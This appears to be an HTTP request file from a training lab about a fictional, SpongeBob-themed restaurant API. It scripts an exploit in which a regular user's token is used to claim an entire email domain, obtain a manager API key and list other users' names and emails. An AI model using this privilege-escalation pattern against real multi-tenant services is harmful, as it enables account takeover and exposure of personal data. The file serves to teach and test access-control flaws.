# @import ../common/setup.http
@host = {{base_host}}/v306

# Plankton discovers he can register new restaurant without having an admin access to their domain.

### Plankton registers as a regular user at bikinibottom.sea
POST /auth/register
Content-Type: application/json

{
    "email": "plankton@bikinibottom.sea"
}

@user_token = {{mailpit.lastEmail("plankton@bikinibottom.sea").userToken()}}


### EXPLOIT: Use USER token to register new restaurant
# Token is for plankton@ but we're claiming the entire domain bikinibottom.sea
POST /restaurants
Content-Type: application/json

{
    "name": "Bikinibottom Restaurant",
    "domain": "bikinibottom.sea",
    "token": "{{user_token}}"
}

@restaurant_id = {{response.parsedBody.id}}
@api_key = {{response.parsedBody.api_key}}
?? status == 201
?? body owner == admin@bikinibottom.sea


### Plankton now owns the bikinibottom.sea domain!
# He can see all users with @bikinibottom.sea emails and gets a manager API key
GET /restaurants/{{restaurant_id}}/users
X-API-Key: {{api_key}}

?? status == 200

// Response leaks existing customers data of the domain bikinibottom.sea
HTTP/1.1 200 OK
[
  {
    "email": "sandy@bikinibottom.sea",
    "name": "Sandy Cheeks"
  },
  {
    "email": "patrick@bikinibottom.sea",
    "name": "Patrick Star"
  }
]
